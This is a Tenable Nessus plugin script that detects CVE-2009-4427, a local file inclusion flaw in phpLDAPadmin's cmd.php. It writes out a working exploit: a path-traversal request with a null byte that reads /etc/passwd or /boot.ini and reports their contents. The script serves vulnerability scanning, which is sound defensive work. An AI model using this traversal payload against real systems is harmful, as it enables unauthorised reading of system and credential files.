#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43402);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2009-4427");
  script_bugtraq_id(37327);
  script_osvdb_id(61139);
  script_xref(name:"EDB-ID", value:"10410");
  script_xref(name:"Secunia", value:"37848");

  script_name(english:"phpLDAPadmin cmd.php cmd Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file through 'cmd' parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that is susceptible
to a local file include attack." );
  script_set_attribute(
    attribute:"description",
    value:
"The version of phpLDAPadmin installed on the remote host fails to
sanitize user-supplied input to the 'cmd' parameter when passed to the
'cmd.php' script before using it to include PHP code.

Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker may be able to leverage this
issue to view arbitrary files or possibly to execute arbitrary PHP
code on the remote host, subject to the privileges of the web server
user id." );
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.2.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);
# 1.2.0 release date ??

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/21"); 
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:deon_george:phpldapadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl", "phpldapadmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpLDAPadmin");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port" + port + " does not support PHP scripts.");

install = get_install_from_kb(appname:'phpLDAPadmin', port:port);
if (isnull(install)) exit(0, "phpLDAPadmin wasn't detected on port "+port+".");

dir = install['dir'];


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "<td> *\[boot loader\]";

# Get the cookie.
res = http_send_recv3(method:"GET",item: dir + "/index.php",port:port,follow_redirect:TRUE);
if (isnull(res)) exit(1, "The web server on port "+ port + " failed to respond.");

cookie = get_http_cookie(name:"PLASESSID");
if (!cookie) exit(1,"Could not get PLASESSID cookie on port "+ port + ".");
cookie = "PLASESSID=" + cookie;

foreach file (files)
{

  url =   dir
       + "/cmd.php?cmd="
       + '../../../../../../../../../../../../../../../..'
       + file + '%00';

  res = http_send_recv3(method:"GET",item:url,port:port,
          add_headers: make_array(
            "Content-Type", "application/x-www-form-urlencoded",
            "Cookie",cookie));
  if (isnull(res)) exit(1, "The web server on port "+ port + " failed to respond.");

  if(egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

      report = '\n' +
        "Nessus was able to exploit the issue to retrieve the contents of" + '\n' +
        "'" + file + "' on the remote host by requesting the following URL " + '\n' +
        "with cookie PLASESSID set." + '\n' +
        '\n' +
        "  " +  build_url(port:port, qs:url) + '\n';

      if (report_verbosity > 1 && 'class="head"></td></tr><tr><td>' >< res[2])
      {
        output = strstr(res[2], 'class="head"></td></tr><tr><td>') - 'class="head"></td></tr><tr><td>';
        output = output - strstr(output,'</td></tr><tr><td class="foot"></td></tr></table></div></td></tr>');

        report = report + '\n' +
          "Here's the contents of the file : " + '\n\n' +
           crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
           output + '\n' +
           crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
       }
       security_warning(port:port, extra:report);
     }
     else security_warning(port);

     exit(0);
  }
}

exit(0, "The phpLDAPadmin install at " +  build_url(qs:dir+'/index.php', port:port) + " is not affected.");
